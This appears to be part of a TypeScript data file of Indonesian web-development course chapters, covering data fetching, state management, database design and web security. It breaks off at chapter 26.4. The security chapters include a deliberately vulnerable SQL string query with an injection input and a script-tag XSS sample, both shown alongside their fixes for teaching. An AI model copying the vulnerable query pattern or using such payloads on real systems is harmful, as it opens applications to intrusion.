    codeExample: { language: "tsx", code: "// Complete CRUD dengan TanStack Query\nimport { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';\n\nfunction UserList() {\n  const queryClient = useQueryClient();\n  const { data: users, isLoading } = useQuery({\n    queryKey: ['users'],\n    queryFn: async () => {\n      const res = await fetch('/api/users');\n      if (!res.ok) throw new Error('Failed to fetch');\n      return res.json();\n    },\n    staleTime: 1000 * 60 * 5,\n  });\n\n  const deleteMutation = useMutation({\n    mutationFn: (id) => fetch(`/api/users/${id}`, { method: 'DELETE' }),\n    onSuccess: () => queryClient.invalidateQueries({ queryKey: ['users'] }),\n  });\n\n  if (isLoading) return <Spinner />;\n  return (\n    <ul>\n      {users?.map(user => (\n        <li key={user.id}>\n          {user.name}\n          <button onClick={() => deleteMutation.mutate(user.id)}>\n            {deleteMutation.isPending ? 'Deleting...' : 'Delete'}\n          </button>\n        </li>\n      ))}\n    </ul>\n  );\n}" },

    explainAlong: "invalidateQueries menghapus cache dan trigger refetch. onSuccess callback di mutation untuk cache invalidation. isPending untuk loading state saat mutating.",

    aiPrompt: "Refactor satu fitur di aplikasimu dari manual fetch ke TanStack Query. Bandingkan jumlah boilerplate code.",

    reflection: "TanStack Query mengurangi boilerplate data fetching 70-80%. Itu adalah waktu yang bisa dihabiskan untuk fitur yang lebih impactful.",

  },

  {

    id: "24.3",

    moduleId: 24,

    chapterNum: "24.3",

    title: "Advanced TanStack Query: Pagination, Infinite Scroll, dan Parallel",

    subtitle: "Pattern advanced untuk kasus penggunaan kompleks",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa implementasi pagination dan infinite scroll",

      "Mengerti parallel queries dan dependent queries",

      "Menguasai prefetching dan placeholder data",

    ],

    analogy: { diagram: "Advanced Patterns:\n├── Pagination -> useQuery + placeholderData\n├── Infinite Scroll -> useInfiniteQuery\n├── Parallel Queries -> automatic\n├── Dependent Queries -> enabled option\n└── Prefetching -> queryClient.prefetchQuery", caption: "TanStack Query punya pattern untuk hampir semua kasus data fetching" },

    explanation: "Setelah menguasai dasar TanStack Query, saatnya mengeksplor pattern advanced untuk kasus penggunaan yang lebih kompleks.\n\n**Pagination**: Gunakan placeholderData untuk keep previous data saat loading halaman baru — mencegah UI flash ke loading state.\n\n**Infinite Scroll**: useInfiniteQuery dengan fetchNextPage dan getNextPageParam. Flatten pages dengan flatMap untuk render.\n\n**Parallel Queries**: Fetch beberapa query secara parallel secara otomatis — cukup panggil useQuery beberapa kali.\n\n**Dependent Queries**: Query B bergantung pada hasil Query A — gunakan enabled option.\n\n**Prefetching**: Prefetch data sebelum user butuh — misalnya saat hover link.",

    codeExample: { language: "tsx", code: "// Infinite scroll dengan Intersection Observer\nimport { useInfiniteQuery } from '@tanstack/react-query';\nimport { useEffect, useRef } from 'react';\n\nfunction Feed() {\n  const { data, fetchNextPage, hasNextPage, isFetchingNextPage } = useInfiniteQuery({\n    queryKey: ['feed'],\n    queryFn: ({ pageParam = 0 }) => fetch(`/api/feed?cursor=${pageParam}`).then(r => r.json()),\n    getNextPageParam: (last) => last.nextCursor,\n    initialPageParam: 0,\n  });\n\n  const loadMoreRef = useRef(null);\n  useEffect(() => {\n    const observer = new IntersectionObserver(\n      ([entry]) => { if (entry.isIntersecting && hasNextPage) fetchNextPage(); },\n      { rootMargin: '200px' }\n    );\n    if (loadMoreRef.current) observer.observe(loadMoreRef.current);\n    return () => observer.disconnect();\n  }, [hasNextPage, fetchNextPage]);\n\n  const items = data?.pages.flatMap(p => p.items) ?? [];\n  return (\n    <>\n      {items.map(item => <PostCard key={item.id} {...item} />)}\n      <div ref={loadMoreRef}>\n        {isFetchingNextPage ? <Spinner /> : hasNextPage ? 'Load more...' : 'End'}\n      </div>\n    </>\n  );\n}" },

    explainAlong: "Intersection Observer dengan rootMargin: '200px' trigger fetch 200px sebelum elemen terlihat — prefetching seamless.",

    aiPrompt: "Implementasikan infinite scroll untuk salah satu fitur di aplikasimu. Bandingkan UX dengan pagination tradisional.",

    reflection: "Prefetching adalah micro-optimization yang powerful — user merasa aplikasi muat instan.",

  },

  {

    id: "24.4",

    moduleId: 24,

    chapterNum: "24.4",

    title: "Zustand dan State Lokal: Client State yang Efisien",

    subtitle: "Kelola client state dengan library lightweight dan powerful",

    level: "Menengah",

    objectives: [

      "Bisa menggunakan Zustand untuk global state",

      "Mengerti middleware (persist, devtools)",

      "Mengerti kapan pakai Zustand vs Context",

    ],

    analogy: { diagram: "State Scale:\nComponent State (useState) -> Component-wide\nContext API -> App section\nZustand/Jotai -> App-wide, complex\nRedux -> Enterprise, complex debugging", caption: "Zustand adalah solusi client state yang simple, powerful, dan tidak memerlukan Provider wrapper" },

    explanation: "Untuk client state (theme, sidebar, modal, cart), kamu butuh state management yang simple dan tidak verbose.\n\nZustand adalah pilihan terbaik untuk kebanyakan proyek modern.\\n\\n**Kenapa Zustand?** No Provider (tidak perlu wrap app), No boilerplate (no actions, no reducers, no dispatch), TypeScript native (types inferred otomatis), Middleware (persist, devtools,\n\nImmer dengan satu baris), Small (~1KB bundle size).\\n\\n**Selector untuk Performance**: Hanya subscribe ke state yang dibutuhkan — mencegah re-render tidak perlu.\\n\\n**Kapan Context Cukup?** Kalau state jarang berubah dan tidak kompleks, Context API sudah cukup.\n\nContext tidak butuh library tambahan dan sudah built-in di React.",

    codeExample: { language: "tsx", code: "// Cart store dengan Zustand + Immer + Persist\nimport { create } from 'zustand';\nimport { persist, immer } from 'zustand/middleware';\n\ninterface CartItem {\n  id: string; name: string; price: number; quantity: number;\n}\n\nexport const useCart = create(persist(immer((set, get) => ({\n  items: [],\n  addItem: (item) => set((draft) => {\n    const existing = draft.items.find(i => i.id === item.id);\n    if (existing) existing.quantity++;\n    else draft.items.push({ ...item, quantity: 1 });\n  }),\n  removeItem: (id) => set((draft) => {\n    draft.items = draft.items.filter(i => i.id !== id);\n  }),\n  updateQuantity: (id, qty) => set((draft) => {\n    const item = draft.items.find(i => i.id === id);\n    if (item) item.quantity = qty;\n  }),\n  total: () => get().items.reduce((sum, i) => sum + i.price * i.quantity, 0),\n  itemCount: () => get().items.reduce((sum, i) => sum + i.quantity, 0),\n})), { name: 'cart-storage' }));" },

    explainAlong: "immer middleware memungkinkan mutasi draft tapi tetap immutable di bawah hood. persist menyimpan ke localStorage.",

    aiPrompt: "Refactor satu fitur dari useState/useContext ke Zustand. Bandingkan jumlah code dan performa.",

    reflection: "State management bukan one-size-fits-all. Pilih tool yang sesuai skala — jangan over-engineer dengan Redux untuk todo list.",

  },

];



// ============================================================

// MODUL 25: DATABASE ENGINEERING (5 chapters)

// ============================================================



const modul25: Chapter[] = [

  {

    id: "25.1",

    moduleId: 25,

    chapterNum: "25.1",

    title: "Database Design: Normalisasi dan Relasi",

    subtitle: "Rancang database yang efisien dengan prinsip normalisasi",

    level: "Menengah",

    objectives: [

      "Memahami 3NF (Third Normal Form)",

      "Bisa merancang schema dengan proper relationships",

      "Mengerti primary key, foreign key, dan indexing dasar",

    ],

    analogy: { diagram: "Normalisasi:\n1NF -> Atomic values, no repeating groups\n2NF -> 1NF + no partial dependency\n3NF -> 2NF + no transitive dependency\n\nRelasi:\n├── One-to-One\n├── One-to-Many\n└── Many-to-Many (junction table)", caption: "Database yang well-designed mengurangi redundancy, mencegah anomaly, dan meningkatkan query performance" },

    explanation: "ORM seperti Drizzle memudahkan interaksi dengan database, tapi tanpa paham database design,\n\nKamu bisa membuat schema yang lambat dan sulit maintain.\\n\\n**Normalisasi** adalah proses mengorganisir data untuk mengurangi redundancy dan mencegah anomaly.\\n\\n**1NF**: Setiap cell berisi single atomic value, tidak ada repeating groups.\n\n**2NF**: Sudah 1NF + semua non-key attributes fully dependent pada primary key.\n\n**3NF**: Sudah 2NF + tidak ada transitive dependency.\\n\\n**Relasi Antar Tabel**: One-to-Many (satu user punya banyak posts, gunakan foreign key di tabel 'many').\n\nMany-to-Many (satu post punya banyak tags, gunakan junction table).\n\nOne-to-One (satu user punya satu profile, gunakan foreign key dengan UNIQUE constraint).",

    codeExample: { language: "sql", code: "-- Schema well-normalized untuk blog\nCREATE TABLE users (\n  id SERIAL PRIMARY KEY,\n  email VARCHAR(255) UNIQUE NOT NULL,\n  name VARCHAR(255) NOT NULL,\n  created_at TIMESTAMP DEFAULT NOW()\n);\n\nCREATE TABLE categories (\n  id SERIAL PRIMARY KEY,\n  name VARCHAR(100) UNIQUE NOT NULL,\n  slug VARCHAR(100) UNIQUE NOT NULL\n);\n\nCREATE TABLE posts (\n  id SERIAL PRIMARY KEY,\n  title VARCHAR(255) NOT NULL,\n  slug VARCHAR(255) UNIQUE NOT NULL,\n  content TEXT NOT NULL,\n  user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,\n  category_id INTEGER REFERENCES categories(id) ON DELETE SET NULL,\n  published_at TIMESTAMP,\n  created_at TIMESTAMP DEFAULT NOW()\n);\n\n-- Many-to-Many: posts <-> tags\nCREATE TABLE tags (id SERIAL PRIMARY KEY, name VARCHAR(50) UNIQUE NOT NULL);\nCREATE TABLE post_tags (\n  post_id INTEGER REFERENCES posts(id) ON DELETE CASCADE,\n  tag_id INTEGER REFERENCES tags(id) ON DELETE CASCADE,\n  PRIMARY KEY (post_id, tag_id)\n);\n\nCREATE INDEX idx_posts_user ON posts(user_id);\nCREATE INDEX idx_posts_category ON posts(category_id);\nCREATE INDEX idx_posts_published ON posts(published_at) WHERE published_at IS NOT NULL;" },

    explainAlong: "ON DELETE CASCADE: hapus posts kalau user dihapus. ON DELETE SET NULL: set category_id jadi NULL. Partial index: hanya index published posts.",

    aiPrompt: "Rancang schema database untuk e-commerce: users, products, categories, orders, order_items, reviews. Normalisasi sampai 3NF.",

    reflection: "Denormalization kadang necessary untuk performa — tapi selalu mulai dari normalized schema.",

  },

  {

    id: "25.2",

    moduleId: 25,

    chapterNum: "25.2",

    title: "Indexing: Mempercepat Query 100x",

    subtitle: "Pahami cara kerja index dan pilih strategi yang tepat",

    level: "Menengah-Lanjut",

    objectives: [

      "Memahami B-Tree index dan cara kerjanya",

      "Bisa membuat single dan composite indexes",

      "Mengerti trade-off indexing",

    ],

    analogy: { diagram: "Indexing:\n├── B-Tree (default) -> equality, range, ORDER BY\n├── Hash -> exact match only\n├── GIN -> full-text search, arrays, JSONB\n└── GiST -> geometric data, ranges\n\nTrade-off: Faster reads, slower writes, more storage", caption: "Index mempercepat query seperti indeks di buku — tapi butuh maintenance dan storage tambahan" },

    explanation: "Bayangkan kamu mencari topik di buku tebal 1000 halaman tanpa indeks.\n\nDatabase index bekerja seperti indeks buku — mempercepat pencarian dengan trade-off storage dan write performance.\\n\\n**B-Tree Index**: Balanced Tree dengan kompleksitas O(log n).\n\nCocok untuk: WHERE clause (equality dan range), JOIN conditions, ORDER BY, GROUP BY.\\n\\n**Kapan Index Tidak Berguna**: Tabel kecil (< 1000 row),\n\nKolom dengan cardinality rendah (gender, boolean), frequent writes (setiap insert/update/delete harus update index).\\n\\n**Composite Index**: Index dengan multiple columns.\n\nUrutan penting — gunakan leading column di WHERE clause.\\n\\n**Covering Index**: Index yang mencakup semua columns yang dibutuhkan query — query bisa dijawab hanya dari index tanpa mengakses tabel.",

    codeExample: { language: "sql", code: "-- Analisis query plan dengan EXPLAIN\nEXPLAIN ANALYZE\nSELECT p.title, u.name, c.name\nFROM posts p\nJOIN users u ON p.user_id = u.id\nJOIN categories c ON p.category_id = c.id\nWHERE c.slug = 'technology'\nORDER BY p.published_at DESC\nLIMIT 10;\n\n-- Optimasi: tambah index untuk category slug + composite index\nCREATE INDEX idx_categories_slug ON categories(slug);\nCREATE INDEX idx_posts_category_published ON posts(category_id, published_at DESC);\n\n-- Partial index untuk published posts only\nCREATE INDEX idx_published_posts ON posts(category_id, published_at)\nWHERE published_at IS NOT NULL;\n\n-- Expression index untuk case-insensitive search\nCREATE INDEX idx_users_email_lower ON users(LOWER(email));\n\n-- Query yang menggunakan expression index:\nSELECT * FROM users WHERE LOWER(email) = LOWER('User@Example.COM');" },

    explainAlong: "EXPLAIN ANALYZE menunjukkan actual execution time dan plan. Index-only scan adalah yang paling cepat. Partial index lebih kecil dan lebih cepat untuk subset data.",

    aiPrompt: "Jalankan EXPLAIN ANALYZE pada query paling lambat di aplikasimu. Identifikasi missing indexes dan buat.",

    reflection: "Index adalah solusi #1 untuk query lambat. Tapi jangan over-index — setiap index memperlambat writes dan memakan storage.",

  },

  {

    id: "25.3",

    moduleId: 25,

    chapterNum: "25.3",

    title: "Query Optimization dan Execution Plan",

    subtitle: "Tulis query yang efisien dan pahami cara database mengeksekusinya",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa membaca dan menginterpretasi EXPLAIN output",

      "Mengerti common query anti-patterns",

      "Bisa menulis efficient joins dan subqueries",

    ],

    analogy: { diagram: "Query Optimization:\n├── EXPLAIN ANALYZE -> Lihat execution plan\n├── Avoid SELECT * -> Hanya ambil yang perlu\n├── Proper JOIN types -> INNER, LEFT, SEMI\n├── Batch operations -> Bulk insert, UPDATE dengan JOIN\n└── CTE vs Subquery -> Pilih yang lebih readable dan cepat", caption: "Query yang lambat bisa memperlambat seluruh aplikasi — optimization adalah skill backend wajib" },

    explanation: "Satu query yang lambat bisa memperlambat seluruh aplikasi. Mari pelajari cara menulis query yang efisien dan mengidentifikasi bottleneck.\\n\\n**EXPLAIN ANALYZE**: Perintah paling penting untuk query optimization. Menunjukkan execution plan, cost estimation, actual execution time, dan row count.\\n\\n**Common Anti-Patterns**: SELECT * (ambil semua columns padahal hanya butuh beberapa — lebih lambat, lebih banyak memory). N+1 Query (fetch list lalu fetch detail satu per satu di loop — 101 queries untuk 100 items!).\n\nMissing LIMIT (SELECT tanpa LIMIT bisa mengembalikan jutaan row).\n\nFunctions on indexed columns (WHERE LOWER(email) = 'a@b.com' — function membuat index tidak usable kecuali expression index).\\n\\n**Efficient Joins**: INNER JOIN (hanya row yang match),\n\nLEFT JOIN (semua row dari kiri, null kalau tidak match), EXISTS/NOT EXISTS (lebih efisien daripada IN/NOT IN untuk subquery).\\n\\n**Batch Operations**: Lakukan operasi dalam batch, bukan satu per satu.",

    codeExample: { language: "sql", code: "-- N+1 Problem Solution: JOIN\nSELECT p.title, u.name AS author_name,\n       COUNT(c.id) AS comment_count\nFROM posts p\nINNER JOIN users u ON p.user_id = u.id\nLEFT JOIN comments c ON c.post_id = p.id\nWHERE p.published_at IS NOT NULL\nGROUP BY p.id, u.name\nORDER BY p.published_at DESC\nLIMIT 20;\n\n-- Efficient pagination dengan keyset (cursor-based)\n-- ❌ OFFSET lambat untuk page besar\nSELECT * FROM posts ORDER BY id LIMIT 10 OFFSET 100000;\n\n-- ✅ Keyset pagination (WHERE + LIMIT)\nSELECT * FROM posts\nWHERE id < :last_seen_id\nORDER BY id DESC\nLIMIT 10;\n\n-- CTE untuk query kompleks yang readable\nWITH published_stats AS (\n  SELECT category_id, COUNT(*) AS post_count,\n         MAX(published_at) AS latest_post\n  FROM posts WHERE published_at IS NOT NULL\n  GROUP BY category_id\n)\nSELECT c.name, COALESCE(ps.post_count, 0) AS posts, ps.latest_post\nFROM categories c\nLEFT JOIN published_stats ps ON ps.category_id = c.id\nORDER BY ps.post_count DESC;" },

    explainAlong: "Keyset pagination menggunakan WHERE + LIMIT — jauh lebih cepat daripada OFFSET untuk page besar. CTE membuat query kompleks lebih readable.",

    aiPrompt: "Identifikasi N+1 queries di aplikasimu. Refactor menjadi JOIN atau batch query. Ukur perbedaan performa.",

    reflection: "Rule of thumb: query yang lambat > 100ms untuk user-facing endpoint perlu dioptimasi.",

  },

  {

    id: "25.4",

    moduleId: 25,

    chapterNum: "25.4",

    title: "Transaction, Concurrency, dan Data Integrity",

    subtitle: "Pastikan data konsisten dan aman saat banyak user mengakses bersamaan",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa menggunakan transactions dengan benar",

      "Mengerti isolation levels",

      "Mengerti locking dan deadlock prevention",

    ],

    analogy: { diagram: "Transaction: ACID\n├── Atomicity -> All or nothing\n├── Consistency -> Data valid\n├── Isolation -> Concurrent transactions don't interfere\n└── Durability -> Committed data survives crash", caption: "Transaction memastikan data integrity — terutama untuk operasi finansial dan inventory" },

    explanation: "Bayangkan kamu transfer uang dari rekening A ke rekening B.\n\nDua operasi harus terjadi: kurangi A dan tambah B.\n\nKalau operasi pertama berhasil tapi kedua gagal, uang hilang!\n\nTransaction memastikan kedua operasi berhasil ATAU gagal bersama — tidak ada setengah-setengah.\\n\\n**ACID Properties**: Atomicity (semua operasi berhasil atau gagal semua), Consistency (database selalu dalam state yang valid), Isolation (concurrent transactions tidak saling mengganggu), Durability (data yang di-commit tetap ada meski sistem crash).\\n\\n**Isolation Levels**: READ UNCOMMITTED (bisa baca uncommitted data — dirty read),\n\nREAD COMMITTED (default di PostgreSQL — hanya baca committed data), REPEATABLE READ (data yang dibaca tetap sama dalam transaction), SERIALIZABLE (paling aman, paling lambat — transaction berjalan seolah-olah sequential).\\n\\n**Optimistic Locking**: Gunakan version number untuk detect conflict.\n\nKalau version sudah berubah saat update, retry dengan data terbaru.",

    codeExample: { language: "sql", code: "-- Transfer dengan transaction\nBEGIN;\nUPDATE accounts SET balance = balance - 100 WHERE id = 'A' AND balance >= 100;\nIF NOT FOUND THEN ROLLBACK; RAISE EXCEPTION 'Insufficient balance'; END IF;\nUPDATE accounts SET balance = balance + 100 WHERE id = 'B';\nINSERT INTO transactions (from_account, to_account, amount) VALUES ('A', 'B', 100);\nCOMMIT;\n\n-- Optimistic locking untuk inventory\nUPDATE products\nSET stock = stock - :quantity, version = version + 1, updated_at = NOW()\nWHERE id = :product_id AND stock >= :quantity AND version = :expected_version;\n\n-- Cek rows affected:\n-- 0 rows = conflict, perlu retry dengan version terbaru" },

    explainAlong: "BEGIN...COMMIT membungkus operasi menjadi atomic unit. Optimistic locking dengan version number untuk handle concurrent updates.",

    aiPrompt: "Implementasikan transaction untuk checkout flow: kurangi stock, buat order, catat payment. Semua harus atomic.",

    reflection: "Tanpa transaction, race condition bisa menyebabkan data corruption — terutama untuk operasi finansial dan inventory.",

  },

  {

    id: "25.5",

    moduleId: 25,

    chapterNum: "25.5",

    title: "Database di Production: Replication, Backup, dan Monitoring",

    subtitle: "Persiapkan database untuk production workload",

    level: "Menengah-Lanjut",

    objectives: [

      "Mengerti read replication",

      "Bisa setup backup strategy",

      "Mengerti connection pooling dan monitoring",

    ],

    analogy: { diagram: "Production Database:\n├── Read Replicas -> Scale reads\n├── Connection Pooling -> PgBouncer/built-in\n├── Backups -> PITR (Point-in-Time Recovery)\n└── Monitoring -> Slow query log, metrics", caption: "Database production butuh strategi scaling, backup, dan monitoring yang matang" },

    explanation: "Setelah database berjalan di production, ada aspek operasional yang harus diperhatikan.\\n\\n**Read Replication**: Master database menerima writes, replica database menerima reads.\n\nMengurangi beban master dan meningkatkan throughput.\\n\\n**Connection Pooling**: Membuat pool of connections yang reusable — menghindari overhead create/destroy connection per request.\\n\\n**Backup Strategy**: Logical backups (pg_dump — portable, lambat restore), Physical backups (copy data files — cepat restore),\n\nPITR (Point-in-Time Recovery — continuous archiving, bisa restore ke waktu spesifik).\\n\\n**Monitoring**: Slow query log (query yang lambat), pg_stat_statements (statistics per query), connection count (jangan sampai max connections tercapai), disk usage (alert sebelum penuh), replication lag (slave tidak tertinggal jauh dari master).",

    codeExample: { language: "sql", code: "-- Setup read replica (PostgreSQL)\n-- Di primary, edit postgresql.conf:\nwal_level = replica\nmax_wal_senders = 10\nmax_replication_slots = 10\n\n-- Connection pooling\nconst pool = new Pool({\n  host: process.env.DB_HOST,\n  database: process.env.DB_NAME,\n  user: process.env.DB_USER,\n  password: process.env.DB_PASS,\n  max: 20,          // Max connections in pool\n  idleTimeoutMillis: 30000,\n  connectionTimeoutMillis: 2000,\n});\n\n-- Monitoring: slow queries\n-- postgresql.conf\nlog_min_duration_statement = 1000  -- Log queries > 1 second\n\n-- Find slow queries in real-time\nSELECT query, calls, mean_exec_time, total_exec_time\nFROM pg_stat_statements\nORDER BY mean_exec_time DESC\nLIMIT 10;" },

    explainAlong: "Pool dengan max: 20 membatasi concurrent connections. log_min_duration_statement untuk identify query lambat. pg_stat_statements untuk query-level statistics.",

    aiPrompt: "Setup monitoring untuk database-mu: slow query log, connection count, dan disk usage. Buat alert untuk anomaly.",

    reflection: "Database downtime = aplikasi tidak berfungsi. Investasi di backup dan monitoring akan menyelamatkanmu dari malam panjang debugging.",

  },

];



// ============================================================

// MODUL 26: WEB SECURITY ADVANCED (4 chapters)

// ============================================================



const modul26: Chapter[] = [

  {

    id: "26.1",

    moduleId: 26,

    chapterNum: "26.1",

    title: "OWASP Top 10: Ancaman Paling Umum di Web",

    subtitle: "Kenali dan mitigasi 10 ancaman security paling umum di aplikasi web",

    level: "Menengah",

    objectives: [

      "Memahami OWASP Top 10",

      "Bisa mengidentifikasi vulnerability di kode",

      "Mengerti mitigasi untuk masing-masing ancaman",

    ],

    analogy: { diagram: "OWASP Top 10:\n├── A01: Broken Access Control\n├── A02: Cryptographic Failures\n├── A03: Injection (SQL, NoSQL, Command)\n├── A04: Insecure Design\n├── A05: Security Misconfiguration\n├── A06: Vulnerable Components\n├── A07: Auth Failures\n├── A08: Data Integrity Failures\n├── A09: Logging Failures\n└── A10: SSRF", caption: "OWASP Top 10 adalah daftar ancaman security paling kritis untuk aplikasi web — wajib diketahui setiap developer" },

    explanation: "OWASP (Open Web Application Security Project) adalah organisasi non-profit yang fokus pada keamanan aplikasi web. OWASP Top 10 adalah daftar 10 ancaman security paling kritis yang diupdate setiap 2-3 tahun berdasarkan data dari jutaan aplikasi.\\n\\n**A01: Broken Access Control**: User bisa mengakses resource yang seharusnya tidak bisa diakses. Contoh: mengubah ID di URL untuk melihat data user lain. Mitigasi: enforce access control di server, deny by default, CORS proper configuration.\\n\\n**A02: Cryptographic Failures**: Data sensitif tidak dienkripsi dengan benar.\n\nContoh: menyimpan password plain text, menggunakan HTTP untuk form login. Mitigasi: encrypt data at rest and in transit, gunakan HTTPS, jangan hardcode secrets.\\n\\n**A03: Injection**: Data tidak tertrusted dikirim ke interpreter sebagai query/command. Contoh: SQL injection, NoSQL injection, Command injection. Mitigasi: parameterized queries, input validation, ORM.\\n\\n**A05: Security Misconfiguration**: Konfigurasi security yang kurang, tidak tepat, atau tidak di-maintain.\n\nContoh: default credentials, unnecessary features enabled, error message yang menampilkan stack trace. Mitigasi: hardening, minimal platform, automated patching.\\n\\n**A06: Vulnerable Components**: Dependency (library/framework) yang punya vulnerability diketahui. Mitigasi: regular dependency audit (npm audit, Snyk), automated updates.",

    codeExample: { language: "typescript", code: "// Mitigasi SQL Injection: parameterized queries\n// ❌ VULNERABLE\nconst query = `SELECT * FROM users WHERE email = '${email}'`;\n// Input: email = \"' OR '1'='1\" → returns all users!\n\n// ✅ SAFE dengan parameterized query\nconst result = await db\n  .select().from(users)\n  .where(eq(users.email, email)); // Drizzle ORM automatically parameterizes\n\n// Mitigasi Broken Access Control\napp.get('/api/orders/:id', async (c) => {\n  const orderId = c.req.param('id');\n  const userId = c.get('userId'); // From JWT token\n  \n  const order = await db.select().from(orders)\n    .where(and(eq(orders.id, orderId), eq(orders.userId, userId)))\n    .limit(1);\n  \n  if (!order.length) return c.json({ error: 'Not found' }, 404);\n  return c.json(order[0]);\n});" },

    explainAlong: "Parameterized queries memisahkan data dari command — input diperlakukan sebagai data, bukan executable code. Access control harus di-verify di server, jangan percaya client.",

    aiPrompt: "Lakukan security audit di aplikasimu: cek input validation, access control, dan dependency vulnerabilities.",

    reflection: "Security bukan feature — itu adalah process. OWASP Top 10 harus di-review secara berkala karena ancaman terus berkembang.",

  },

  {

    id: "26.2",

    moduleId: 26,

    chapterNum: "26.2",

    title: "JWT Security: Token, Refresh, dan Best Practices",

    subtitle: "Implementasikan autentikasi yang aman dengan JWT",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa mengimplementasikan JWT dengan aman",

      "Mengerti refresh token rotation",

      "Mengerti token storage dan XSS prevention",

    ],

    analogy: { diagram: "JWT Flow:\nLogin -> Access Token (short-lived) + Refresh Token (long-lived)\nAccess -> Verify Access Token\nExpired -> Refresh with Refresh Token\nLogout -> Blacklist Refresh Token", caption: "JWT adalah standar untuk token autentikasi — tapi implementasi yang salah bisa menyebabkan security breach" },

    explanation: "JWT (JSON Web Token) adalah standar untuk token autentikasi yang terdiri dari 3 bagian: Header (algorithm), Payload (claims/data), dan Signature (verifikasi). Tapi implementasi JWT yang salah bisa menyebabkan security breach.\\n\\n**JWT Security Best Practices**: Gunakan algoritma yang kuat (RS256/ES256, jangan HS256 untuk distributed systems). Access token short-lived (15 menit). Refresh token long-lived dengan rotation (setiap refresh, generate token baru dan invalidate yang lama).\n\nStore access token di memory (bukan localStorage — vulnerable XSS). Store refresh token di httpOnly cookie.\\n\\n**Refresh Token Rotation**: Setiap kali refresh token digunakan untuk mendapatkan access token baru, generate refresh token baru juga. Invalid refresh token yang lama. Ini mencegah refresh token reuse kalau dicuri.\\n\\n**Logout**: Blacklist refresh token di database/Redis.\n\nAccess token biarkan expire (short-lived anyway).",

    codeExample: { language: "typescript", code: "// JWT implementation dengan Hono\nimport { jwt, sign, verify } from 'hono/jwt';\n\n// Login: generate access + refresh token\napp.post('/auth/login', async (c) => {\n  const { email, password } = await c.req.json();\n  const user = await authenticate(email, password);\n  \n  const accessToken = await sign(\n    { sub: user.id, type: 'access' },\n    ACCESS_SECRET,\n    'HS256' // Use RS256 in production\n  );\n  \n  const refreshToken = await sign(\n    { sub: user.id, jti: crypto.randomUUID(), type: 'refresh' },\n    REFRESH_SECRET,\n    'HS256'\n  );\n  \n  await storeRefreshToken(user.id, refreshToken);\n  \n  return c.json({ accessToken, refreshToken });\n});\n\n// Refresh token rotation\napp.post('/auth/refresh', async (c) => {\n  const { refreshToken } = await c.req.json();\n  const payload = await verify(refreshToken, REFRESH_SECRET);\n  \n  const stored = await getRefreshToken(payload.sub);\n  if (stored !== refreshToken) return c.json({ error: 'Invalid' }, 401);\n  \n  const newAccess = await sign({ sub: payload.sub }, ACCESS_SECRET, 'HS256');\n  const newRefresh = await sign(\n    { sub: payload.sub, jti: crypto.randomUUID() },\n    REFRESH_SECRET,\n    'HS256'\n  );\n  \n  await replaceRefreshToken(payload.sub, refreshToken, newRefresh);\n  return c.json({ accessToken: newAccess, refreshToken: newRefresh });\n});" },

    explainAlong: "Refresh token rotation: setiap refresh generate token baru dan invalidate yang lama. Jti (JWT ID) untuk unique identification dan blacklist tracking.",

    aiPrompt: "Implementasikan refresh token rotation di aplikasimu. Setup blacklist untuk revoked tokens dengan Redis TTL.",

    reflection: "JWT tidak bisa di-revoke secara instant — itu adalah trade-off. Makanya access token harus short-lived (15 menit).",

  },

  {

    id: "26.3",

    moduleId: 26,

    chapterNum: "26.3",

    title: "XSS, CSRF, dan Content Security Policy",

    subtitle: "Lindungi aplikasi dari client-side attacks",

    level: "Menengah-Lanjut",

    objectives: [

      "Memahami XSS dan cara mencegahnya",

      "Mengerti CSRF protection",

      "Bisa mengkonfigurasi Content Security Policy",

    ],

    analogy: { diagram: "Client-Side Attacks:\n├── XSS (Cross-Site Scripting)\n│   ├── Stored XSS\n│   ├── Reflected XSS\n│   └── DOM-based XSS\n├── CSRF (Cross-Site Request Forgery)\n└── CSP (Content Security Policy)", caption: "XSS dan CSRF adalah ancaman yang menargetkan user melalui browser — mitigasi harus di server dan client" },

    explanation: "XSS (Cross-Site Scripting) adalah serangan di mana attacker menyisipkan malicious script ke website.\n\nScript tersebut berjalan di browser user, bisa mencuri cookies, session tokens, atau melakukan action atas nama user.\\n\\n**Jenis XSS**: Stored XSS (script disimpan di database — berbahaya karena affect semua user yang melihat page), Reflected XSS (script di URL — biasanya via phishing link),\n\nDOM-based XSS (script memanipulasi DOM client-side).\\n\\n**Mitigasi XSS**: Sanitize input (DOMPurify untuk HTML), Escape output (jangan render user input sebagai HTML), Content Security Policy (CSP).\\n\\n**CSRF**: Attacker memaksa user untuk melakukan action tidak diinginkan di website yang sudah diautentikasi.\n\nMitigasi: CSRF token, SameSite cookie attribute, validate Origin/Referer header.\\n\\n**Content Security Policy (CSP)**: HTTP header yang mengontrol resource mana yang boleh diload oleh browser.",

    codeExample: { language: "typescript", code: "// CSP Header dengan Hono\napp.use('*', async (c, next) => {\n  c.header('Content-Security-Policy',\n    \"default-src 'self'; \" +\n    \"script-src 'self' 'unsafe-inline'; \" +\n    \"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; \" +\n    \"font-src 'self' https://fonts.gstatic.com; \" +\n    \"img-src 'self' data: https://cdn.example.com; \" +\n    \"connect-src 'self' https://api.example.com; \" +\n    \"frame-ancestors 'none'; \" +\n    \"base-uri 'self';\"\n  );\n  c.header('X-Frame-Options', 'DENY');\n  c.header('X-Content-Type-Options', 'nosniff');\n  c.header('Referrer-Policy', 'strict-origin-when-cross-origin');\n  await next();\n});\n\n// Sanitize HTML input dengan DOMPurify\nimport DOMPurify from 'isomorphic-dompurify';\n\nconst dirty = '<p>Hello</p><script>alert(1)</script>';\nconst clean = DOMPurify.sanitize(dirty);\n// Result: '<p>Hello</p>' — script tag removed\n\n// SameSite cookie untuk CSRF protection\nSet-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/" },

    explainAlong: "CSP adalah defense-in-depth — meski ada XSS vulnerability, CSP bisa mencegah script eksternal dieksekusi. SameSite=Strict cookie mencegah CSRF.",

    aiPrompt: "Setup CSP di aplikasimu. Mulai dengan report-only mode untuk identify breaking changes sebelum enforce.",

    reflection: "Security headers (CSP, HSTS, X-Frame-Options) adalah gratis — tidak ada alasan untuk tidak mengimplementasikannya.",

  },

  {

    id: "26.4",

